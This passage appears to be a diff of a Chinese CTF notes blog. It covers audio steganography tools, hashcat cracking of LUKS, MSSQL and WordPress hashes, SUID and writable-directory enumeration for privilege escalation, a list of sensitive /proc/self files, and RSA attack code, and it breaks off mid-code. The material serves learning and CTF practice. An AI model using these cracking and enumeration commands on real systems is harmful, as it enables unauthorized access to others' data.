 <h2 id="deepsound">deepsound</h2>
 <p>DeepSound 支持 wave、flac、wma、ape 和音频 CD
 数据类型的隐写，并且可以保留文件名。</p>
@@ -1427,6 +1519,18 @@ multifrequency)，即双音多频，由高频群和低频群组成，高低频�
 包管理工具即可安装。</p>
 <p>使用方式：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dtmf2num audio.wav</span><br></pre></td></tr></table></figure>
+<h2 id="ffmpeg">FFmpeg</h2>
+<p>FFmpeg 是万能的格式转换软件，它可以提取出各种格式中的音频流。</p>
+<p>使用命令 <code>ffmpeg -i input.mp4</code>
+可以扫描出文件中所携带的各种流，扫描结果可能展示为
+<code>Stream #0:0[0x1](und): Video</code>，其中 <code>0:0</code>
+是内置编号，<code>Video</code> 代表这个流是音频流。</p>
+<p>使用命令 <code>-map</code> 可以指定编号导出流，导出时最好加上
+<code>-c copy</code>，否则它将使用全新方式导出（速度会慢），例如
+<code>ffmpeg -i input.mp4 -map 0:2 output.mp3</code>。</p>
+<blockquote>
+<p>如果只是导出音频，更推荐使用 Audacity。</p>
+</blockquote>
 <h2 id="lsb-隐写">lsb 隐写</h2>
 <h2 id="morse-code">Morse-Code</h2>
 <p>摩尔斯电码是只使用 0 和 1
@@ -1439,6 +1543,14 @@ multifrequency)，即双音多频，由高频群和低频群组成，高低频�
 <p>使用方式：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">morse2ascii audio.wav</span><br></pre></td></tr></table></figure>
 <h2 id="sstv">SSTV</h2>
+<p>慢扫描电视（Slow-scan
+television），是一种图像传输方式，将图像信息转化为高频率（也可能是低频率）的音频信息（也可以是其他波信息，例如电磁波），以波为载体传输信息。</p>
+<p>比较多使用 MMSSTV 作为制作和转换（接收）SSTV
+信息的工具，但需要安装虚拟声卡，使得输入输出都为虚拟声卡线路（默认为
+Line1）。</p>
+<p>MMSSTV 默认设置可能需要设置为
+24000（正好是声卡设置的一半），然后你应该得到清晰的图像。</p>
+<p>参考链接：<a href="https://amsat-uk.org/beginners/iss-sstv/">https://amsat-uk.org/beginners/iss-sstv/</a></p>
 <h2 id="频谱图隐写">频谱图隐写</h2>
 <p>有时候会将关键信息隐藏在频谱图部分，可以使用 Audacity
 软件查看频谱图部分得到隐藏信息。</p>
@@ -7221,6 +7333,12 @@ r\geq4
 </ul>
 <h2 id="mssql-破解">mssql 破解</h2>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d</span><br></pre></td></tr></table></figure>
+<h2 id="luks-破解">LUKS 破解</h2>
+<p>hashcat 只需要加密文件系统的前 2 MB
+即可推断密码是否已被破解，所以一般建议切割以加速爆破。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=file of=file-cut bs=512 count=4097</span><br></pre></td></tr></table></figure>
+<p>随后跑命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 14600 -a 3 file-cut ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
 <h2 id="wordpress-密码-hash-破解">wordpress 密码 hash 破解</h2>
 <p>具体加密脚本在<code>./wp-includes/class-phpass.php</code>的<code>HashPassword</code>函数</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 400 --force $P<span class="variable">$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY</span>/ ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
@@ -7968,6 +8086,14 @@ Veracrypt 的密钥提取。</p>
 <p>对于 Veracrypt 密钥提取的前提是，设置了密码保存在内存中。</p>
 </blockquote>
 <p>对于 <code>.vmdk</code> 文件可能需要解压缩。</p>
+<h3 id="luks">LUKS</h3>
+<p>LUKS 是流行在 Linux 上的卷加密软件，<del>对标 Windows 平台上的
+BitLocker</del>。</p>
+<p>hashcat 只需要加密文件系统的前 2 MB
+即可推断密码是否已被破解，所以一般建议切割以加速爆破。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=file of=file-cut bs=512 count=4097</span><br></pre></td></tr></table></figure>
+<p>随后跑命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 14600 -a 3 file-cut ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
 <h3 id="veracrypt">Veracrypt</h3>
 <p>Veracrypt 是一款基于 Truecrypt 的开源软件，同款竞品是微软的
 BitLocker，用于加密卷和映像，支持使用明文密码和文件来进行加密卷或映像。</p>
@@ -8013,6 +8139,24 @@ bitlocker 加密卷。</p>
 </blockquote>
 <p>示例：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bdemount -k 0d393d80bf512f5e501a8bfad3272965:cf71859b45775123fcc1dad3007d1c41 D.<span class="built_in">dd</span> ./crypt-1</span><br></pre></td></tr></table></figure>
+<h2 id="特殊软件数据">特殊软件数据</h2>
+<h3 id="gui">GUI</h3>
+<p>对于拥有 GUI 的程序，其输出的 GUI
+图像会被存在相关联的内存中，如果我们将其相关的内存转储(<code>memdump</code>)，通过手工处理（比如说利用GIMP）可以在其中寻找到
+GUI 图像。</p>
+<blockquote>
+<p>参考链接：<a href="https://medium.com/mii-cybersec/remote-desktop-connection-mstsc-exe-screen-in-a-memory-dump-analysis-e7e00895dd4a">https://medium.com/mii-cybersec/remote-desktop-connection-mstsc-exe-screen-in-a-memory-dump-analysis-e7e00895dd4a</a></p>
+</blockquote>
+<h3 id="便笺">便笺</h3>
+<p>便笺数据被存放在 <code>StickyNotes.snt</code> 中。</p>
+<blockquote>
+<p>在 Windows7 中的路径在
+<code>%APPDATA%\Roaming\StickyNotes\StickyNotes.snt</code>。</p>
+<p>在 Windows10 中的路径在</p>
+<p><code>%LOCALAPPDATA%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</code></p>
+</blockquote>
+<p>使用脚本可以导出、还原便笺数据：<a href="https://github.com/dingtoffee/StickyParser">StickyParser</a></p>
+<p>使用 MiTEC 提供的免费软件也可以查看 snt 数据：<a href="http://www.mitec.cz/ssv.html">Structured Storage Viewer</a></p>
 ]]></content>
       <tags>
         <tag>note</tag>
@@ -9666,6 +9810,12 @@ NIC？<em>它是否连接到另一个网络？</em></h4>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -1000 -<span class="built_in">type</span> d 2&gt;/dev/null   <span class="comment"># Sticky bit</span></span><br><span class="line">find / -perm -g=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SGID (chmod 2000)</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SUID (chmod 4000)</span></span><br><span class="line"></span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SGID or SUID</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `locate -r <span class="string">&quot;bin$&quot;</span>`; <span class="keyword">do</span> find <span class="variable">$i</span> \( -perm -4000 -o -perm -2000 \) -<span class="built_in">type</span> f 2&gt;/dev/null; <span class="keyword">done</span>    <span class="comment"># 查找 /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者是 *bin 是否存在 SGID or SUID （快速搜查方式）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 root (/) 开始查找是否存在 SGID or SUID, not Symbolic links, 文件夹深度为 3(可以更改), 并列出错误信息 (例如 permission denied)</span></span><br><span class="line">find / -perm -g=s -o -perm -4000 ! -<span class="built_in">type</span> l -maxdepth 3 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ld &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 <h3 id="查看可写执行目录">查看可写/执行目录</h3>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null      # world-writeable folders</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line"></span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders</span><br><span class="line"></span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</span><br></pre></td></tr></table></figure>
+<h2 id="proc-目录">proc 目录</h2>
+<p>Linux 系统上的 <code>/proc</code> 目录是一种文件系统，即 proc
+文件系统。与其它常见的文件系统不同的是，<code>/proc</code>
+是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p>
+<p>但需要注意，部分内容需要权限才可以读取。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/proc/self/cmdline		<span class="comment"># 启动当前进程的完整命令</span></span><br><span class="line">/proc/self/cwd			<span class="comment"># 指向当前进程运行的工作区的符号链接</span></span><br><span class="line">/proc/self/exe			<span class="comment"># 指向启动当前进程的可执行文件的符号链接</span></span><br><span class="line">/proc/self/envrion		<span class="comment"># 查看进程的环境变量</span></span><br><span class="line">/proc/self/fd/<span class="number">3</span>			<span class="comment"># 查看读取过的文件，输入输出缓冲区</span></span><br><span class="line">/proc/self/maps			<span class="comment"># 内存映射信息</span></span><br></pre></td></tr></table></figure>
 <h1 id="提权">提权</h1>
 <h2 id="suid-提权">SUID 提权</h2>
 <p>SUID 全称是 <strong>S</strong>et owner <strong>U</strong>ser
@@ -12285,6 +12435,8 @@ PNG 图片用 Apple 自家的 PNG 解码器解码就可以分为 2
 <p>或者只对单个颜色信道进行 LSB 隐写提取，例如这里对 R 信道进行 LSB
 隐写提取：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lsb</span>(<span class="params">im</span>):</span><br><span class="line">    im = np.array(im, dtype = np.uint8)[:, :, <span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(im)</span><br><span class="line">    t = im &amp; <span class="number">0x1</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">    <span class="comment"># 返回二进制字符串</span></span><br><span class="line">    <span class="comment"># return &#x27;&#x27;.join(map(str, t.tolist()))</span></span><br></pre></td></tr></table></figure>
+<p>如果发现 LSB 痕迹但无法提取明文，可能考虑是加密后（需要密码）的 LSB
+隐写，可以使用工具 <a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a>。</p>
 <h2 id="oursecret">oursecret</h2>
 <p>oursecret 是一款较老的软件，支持对 jpeg 和 bmp 的隐写。</p>
 <p>它可以隐写任何数据在图像中，并且可以完整提取出包含文件名的数据。</p>
@@ -15140,7 +15292,7 @@ ax+by=0\pmod{d}
 <h2 id="数论模运算">数论模运算</h2>
 <h3 id="除法">除法</h3>
 <p><span class="math display">\[
-c=m\times a\ mod\ n\\
+c=m\times a\ mod\ n\newline
 \]</span></p>
 <p>对于上式，已知<span class="math inline">\(c,a,n\)</span>求<span class="math inline">\(m\)</span>，不能直接求<span class="math inline">\(c\div a\)</span>，需要将其转换为 <span class="math display">\[
 m=c\times invert(a,n)\ mod\ n
@@ -15187,9 +15339,9 @@ mn\)</span></p>
 <span class="math inline">\(p\)</span> 整数 <span class="math inline">\(a\)</span>，有 <span class="math display">\[
 a^{p-1}\equiv1\pmod{p}
 \]</span> 推论有： <span class="math display">\[
-na^{p-1}\equiv n\pmod{p},n\in\Z\\
-a^{p-2}\equiv a^{-1}\pmod{p}\\
-a^b\equiv a^{b\pmod{p-1}}\pmod{p},b\in\Z\\
+na^{p-1}\equiv n\pmod{p},n\in\Z\newline
+a^{p-2}\equiv a^{-1}\pmod{p}\newline
+a^b\equiv a^{b\pmod{p-1}}\pmod{p},b\in\Z\newline
 \]</span></p>
 <h1 id="rsapython-实现">RSA&amp;python 实现</h1>
 <h2 id="加密">加密</h2>
@@ -15265,7 +15417,7 @@ c_1^xc_2^y(mod\ n)=m^{e_1x}m^{e_2y}=m^{e_1x+e_2y}=m^g\pmod{n}
 <span class="math inline">\(\varphi(N)\)</span> 分解</h2>
 <h3 id="原理-2">原理</h3>
 <p>我们已知 <span class="math display">\[
-N=pq\\
+N=pq\newline
 \varphi(N)=(p-1)(q-1)=pq-(p+q)+1=N-(p+q)+1
 \]</span> 我们不妨构建一个二次方程，这个二次方程的两根之和为 <span class="math inline">\(x_1+x_2=p+q\)</span>，两根之积为 <span class="math inline">\(x_1x_2=pq\)</span>，即方程： <span class="math display">\[
 x^2+(\varphi(N)-N-1)x+N=0
@@ -15307,9 +15459,9 @@ k=\frac{k\varphi(N)}{N}+1=k-\left \lceil \frac{p+q+1}{N} \right \rceil
 <p>如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。</p>
 <p>例如当<span class="math inline">\(e=3\)</span>时，有以下等式成立：
 <span class="math display">\[
-c_1=pow(m,e,n_1)\\
-c_2=pow(m,e,n_2)\\
-c_3=pow(m,e,n_3)\\
+c_1=pow(m,e,n_1)\newline
+c_2=pow(m,e,n_2)\newline
+c_3=pow(m,e,n_3)\newline
 \cdots
 \]</span> 对上列等式运用中国剩余定理，得到 <span class="math display">\[
 c_x=pow(m,e,n_1*n_2*n_3*\cdots)
@@ -15358,9 +15510,30 @@ Wiener Attack (维纳攻击) 可以在多项式时间中分解N。</p>
 <h2 id="dp-泄露">dp 泄露</h2>
 <h3 id="实现-7">实现</h3>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span> <span class="keyword">and</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">        p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">        q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">        phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">        d = gmpy2.invert(e, phi)</span><br><span class="line">        m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c, d, n))</span><br></pre></td></tr></table></figure>
+<h2 id="d-泄露攻击"><span class="math inline">\(d\)</span> 泄露攻击</h2>
+<h3 id="原理-7">原理</h3>
+<p>已知 <span class="math inline">\((n,e,d)\)</span>，第一种方式可以将问题转化为已知
+<span class="math inline">\((n,\varphi(n))\)</span>
+的问题，在上文中有原理解释。</p>
+<p>第二种方式是，我们将 <span class="math inline">\(k\varphi(n)\)</span>
+表示为 <span class="math display">\[
+ed-1=k\varphi(n)=2^st
+\]</span> 即奇数 <span class="math inline">\(t\)</span> 与一个偶数 <span class="math inline">\(2^s\)</span> 相乘。</p>
+<p>可以证明得到对于至少一半的 <span class="math inline">\(a\in
+Z_n\)</span>，存在一个 <span class="math inline">\(i\in [1,s]\)</span>
+满足 <span class="math display">\[
+r=a^{2^{i-1}t}\neq \pm1\pmod{n}\newline
+a^{2^it}=1\pmod{n}
+\]</span> 那么此时，<span class="math inline">\(p=\gcd(r-1,n)\)</span>
+是 <span class="math inline">\(n\)</span> 的一个非平凡因子。</p>
+<h3 id="代码">代码</h3>
+<p>已知 <span class="math inline">\((n,\varphi(n))\)</span> 问题：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span></span><br><span class="line">e = <span class="number">13521</span></span><br><span class="line">d = <span class="number">14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">n_with_kphi</span>(<span class="params">n, e, d</span>):</span><br><span class="line">    kphi = e * d - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    k = kphi // n</span><br><span class="line">    <span class="keyword">while</span> kphi % k != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    phi = kphi // k</span><br><span class="line">    <span class="comment"># 构建方程 x^2+(\varphi(N)-N-1)x+N=0</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = phi - n - <span class="number">1</span></span><br><span class="line">    c = n</span><br><span class="line">    delta = b ** <span class="number">2</span> - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">if</span> delta &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line">    sqrt_delta = isqrt(delta)</span><br><span class="line">    p = (-b + sqrt_delta) // (<span class="number">2</span> * a)</span><br><span class="line">    q = (-b - sqrt_delta) // (<span class="number">2</span> * a)</span><br><span class="line">    <span class="keyword">if</span> p * q != n:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(n_with_kphi(n, e, d))</span><br></pre></td></tr></table></figure>
+<p>第二种暴力破解法：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span></span><br><span class="line">e = <span class="number">13521</span></span><br><span class="line">d = <span class="number">14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">kphi_2st</span>(<span class="params">n, e, d</span>):</span><br><span class="line">    kphi = e * d - <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> kphi % (<span class="number">2</span> ** s) == <span class="number">0</span>:</span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">    <span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">        a = randint(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, s + <span class="number">1</span>):</span><br><span class="line">            r = <span class="built_in">pow</span>(a, kphi // (<span class="number">2</span> ** i), n)</span><br><span class="line">            p = gcd(r - <span class="number">1</span>, n)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span> &lt; p &lt; n <span class="keyword">and</span> n % p == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> p, n // p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(kphi_2st(n, e, d))</span><br></pre></td></tr></table></figure>
 <h2 id="已知-p-高位">已知 <span class="math inline">\(p\)</span>
 高位</h2>
-<h3 id="原理-7">原理</h3>
+<h3 id="原理-8">原理</h3>
 <p>已知 <span class="math inline">\(p\)</span> 的一半高位时，可以使用
 Coppersmith 方法分解 <span class="math inline">\(N\)</span>。</p>
 <p>其中在 Coppersmith 方法里，<span class="math inline">\(X\)</span> 为
@@ -15376,7 +15549,7 @@ Coppersmith 方法分解 <span class="math inline">\(N\)</span>。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phigh = <span class="number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line">N = <span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line"><span class="comment"># 未知的位数</span></span><br><span class="line">kbits = <span class="number">200</span></span><br><span class="line"><span class="comment"># beta值按需修改</span></span><br><span class="line">beta = <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = Zmod(N)[]</span><br><span class="line">f = x + (phigh &lt;&lt; kbits)</span><br><span class="line">p0 = f.small_roots(X=<span class="number">2</span>**kbits, beta=beta)</span><br><span class="line"><span class="keyword">assert</span>(p0)</span><br><span class="line">p0 = p0[<span class="number">0</span>]</span><br><span class="line">p = Integer(f(p0))</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure>
 <h2 id="已知-p-低位">已知 <span class="math inline">\(p\)</span>
 低位</h2>
-<h3 id="原理-8">原理</h3>
+<h3 id="原理-9">原理</h3>
 <p>假设已知 <span class="math inline">\(p\)</span> 的 <span class="math inline">\(k\)</span> 个低位，那么有： <span class="math display">\[
 p \pmod{2^k}=p_0
 \]</span> 即 <span class="math display">\[
@@ -15389,29 +15562,23 @@ np_0^{-1}=q+\alpha qp_0^{-1}\cdot2^k
 q\pmod{2^k}=np_0^{-1}\pmod{2^k}
 \]</span> 换句话说，知道 <span class="math inline">\(p\)</span>
 低位，即可求 <span class="math inline">\(q\)</span> 低位。</p>
-<h2 id="e与varphin-不互素"><span class="math inline">\(e\)</span>与<span class="math inline">\(\varphi(n)\)</span> 不互素</h2>
-<h3 id="原理-9">原理</h3>
-<p>已知<span class="math inline">\(c_1,c_2,p,q_1,q_2,n_1=pq_1,n_2=pq_2,e\)</span>，则有
-<span class="math display">\[
-k=\gcd(e,\varphi(n))\\
-c_1=m^{k\frac{e_1}{k}}mod\ n_1\\
-c_2=m^{k\frac{e_2}{k}}mod\ n_2\\
-\]</span> 则 <span class="math display">\[
-m^k=c_1^{d_1}mod\ n_1\\
-m^k=c_2^{d_2}mod\ n_2
-\]</span> 即 <span class="math display">\[
-\begin{cases}
-m^k=c_1^{d_1}mod\ p\\
-m^k=c_2^{d_2}mod\ p\\
-m^k=c_1^{d_1}mod\ q_1\\
-m^k=c_2^{d_2}mod\ q_2
-\end{cases}
-\]</span> 合并后，利用中国剩余定理求特解： <span class="math display">\[
-last=CRT((c_1^{d_1},c_2^{d_2}),(q_1,q_2))
-\]</span> 其中假设<span class="math inline">\(k=ab,b与\varphi(q_1q_2)互素\)</span>，则有 <span class="math display">\[
-d=invert(b,\varphi(q_1q_2))\\
-m^{ab}=kq_1q_2+last
-\]</span></p>
+<h2 id="e-与-varphin-不互素"><span class="math inline">\(e\)</span> 与
+<span class="math inline">\(\varphi(n)\)</span> 不互素</h2>
+<h3 id="原理-10">原理</h3>
+<p>先考虑对于素数 <span class="math inline">\(p\)</span>，满足 <span class="math display">\[
+c_p=m^e\pmod{p}
+\]</span> 那么有 <span class="math inline">\(d_p=e^{-1}\pmod{p}\)</span>，使得 <span class="math display">\[
+m_p\equiv c_p^{d_p}\pmod{p}\equiv m\pmod{p}
+\]</span> 当 <span class="math inline">\(\gcd(e,p-1)\neq 1\)</span>
+时，此时无法直接求出 <span class="math inline">\(d_p\)</span>（或者说存在多个 <span class="math inline">\(m_p\)</span>），那么我们令 <span class="math inline">\(k=\gcd(e,p-1)\)</span>，那么 <span class="math inline">\(\gcd(e/k,p-1)=1\)</span>，那么 <span class="math display">\[
+d_p&#39;=(e/k)^{-1}\pmod{p}\\
+m_p^k\equiv c_p^{d_p&#39;}\pmod{p}
+\]</span> 此时相当于变为了加密指数为 <span class="math inline">\(k\)</span> 的 RSA 问题，可以使用 AMM 算法求解
+<span class="math inline">\(m_p\)</span>。</p>
+<p>那么对于 <span class="math inline">\(n=pq\)</span>，我们首先计算出
+<span class="math inline">\(m_p\)</span> 和 <span class="math inline">\(m_q\)</span> 后，对其进行 CRT 即可求出 <span class="math inline">\(m\)</span>。</p>
+<h3 id="代码-1">代码</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">delta: <span class="built_in">int</span>, r: <span class="built_in">int</span>, q: <span class="built_in">int</span>, <span class="built_in">all</span>: <span class="built_in">bool</span> = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用AMM算法进行有限域开根，即求delta^(1/r)%q下的解</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    `Parameter`:</span></span><br><span class="line"><span class="string">        delta - 底数</span></span><br><span class="line"><span class="string">        r - 根指数</span></span><br><span class="line"><span class="string">        q - 模数</span></span><br><span class="line"><span class="string">        all - 是否返回所有解</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    `Return`:</span></span><br><span class="line"><span class="string">        delta^(1/r)%q下的一个根</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (q - <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;使用AMM算法需要满足e||(q-1)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># step 1</span></span><br><span class="line">    Fq = GF(q)</span><br><span class="line">    delta = Fq(delta)</span><br><span class="line">    rho = Fq.random_element()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step 2</span></span><br><span class="line">    <span class="keyword">while</span> rho ** ((q - <span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        rho = Fq.random_element()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># step 3</span></span><br><span class="line">    <span class="comment"># step 3.1</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s //= r</span><br><span class="line">    <span class="comment"># step 3.2</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alpha = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    <span class="comment"># step 3.3</span></span><br><span class="line">    a = rho ** (r ** t - <span class="number">1</span> * s)</span><br><span class="line">    b = delta ** (r * alpha - <span class="number">1</span>)</span><br><span class="line">    c = rho ** s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># step 4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ** <span class="built_in">pow</span>(r, t - <span class="number">1</span> - i, q - <span class="number">1</span>)</span><br><span class="line">        j = <span class="number">0</span> <span class="keyword">if</span> d == <span class="number">1</span> <span class="keyword">else</span> -d.log(a)</span><br><span class="line">        b *= (c ** r) ** j</span><br><span class="line">        h *= c ** j</span><br><span class="line">        c **= r</span><br><span class="line"></span><br><span class="line">    <span class="comment"># step 5</span></span><br><span class="line">    root = <span class="built_in">int</span>(delta ** alpha * h)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>:</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># if all is True, generate all roots to return</span></span><br><span class="line">    <span class="comment"># 2 ^ (q - 1) == 1 (mod q) because of Fermat&#x27;s little theorem</span></span><br><span class="line">    g = <span class="built_in">pow</span>(<span class="number">2</span>, (q - <span class="number">1</span>) // r, q)</span><br><span class="line">    <span class="comment"># find all primitive i-th roots of 1</span></span><br><span class="line">    ith_roots = [<span class="built_in">pow</span>(g, i, q) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r)]</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(root * ith_root % q) <span class="keyword">for</span> ith_root <span class="keyword">in</span> ith_roots]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, e, p</span>):</span><br><span class="line">    k = gcd(e, p - <span class="number">1</span>)</span><br><span class="line">    dp = <span class="built_in">pow</span>(e // k, -<span class="number">1</span>, p - 